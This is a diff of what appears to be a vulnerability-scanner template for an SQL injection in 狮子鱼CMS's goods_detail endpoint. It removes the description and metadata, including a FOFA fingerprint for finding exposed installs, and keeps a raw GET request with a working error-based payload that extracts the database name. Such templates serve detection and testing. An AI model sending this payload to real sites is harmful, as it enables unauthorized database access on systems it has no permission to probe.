@@ -3,12 +3,8 @@ info:
   name: 狮子鱼CMS goods_detail 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vgyoabfsxiec88un'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vgyoabfsxiec88un
-    fofa: body="/seller.php?s=/Public/login"
 http:
 - raw:
   - 'GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1) HTTP/1.1
